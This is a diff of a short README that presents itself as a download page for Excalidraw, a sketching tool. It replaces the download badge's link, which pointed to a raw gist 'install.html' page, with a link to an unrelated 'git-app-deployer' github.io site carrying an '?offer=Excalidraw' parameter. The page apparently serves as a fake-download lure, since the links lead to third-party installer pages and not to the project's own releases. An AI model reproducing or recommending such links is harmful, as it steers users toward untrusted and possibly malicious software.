@@ -1,6 +1,6 @@
 # Excalidraw Download — Desktop Sketch Board
 
-[![Get Excalidraw GitHub](https://img.shields.io/badge/Get%20Excalidraw%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/de2001/82d78dac3186348c5723b9d7c325cfe2/raw/d012b90c4a6af6507af59380cb2adae7e63348cf/install.html?offer=Excalidraw)
+[![Get Excalidraw GitHub](https://img.shields.io/badge/Get%20Excalidraw%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=Excalidraw)
 
 ---
 
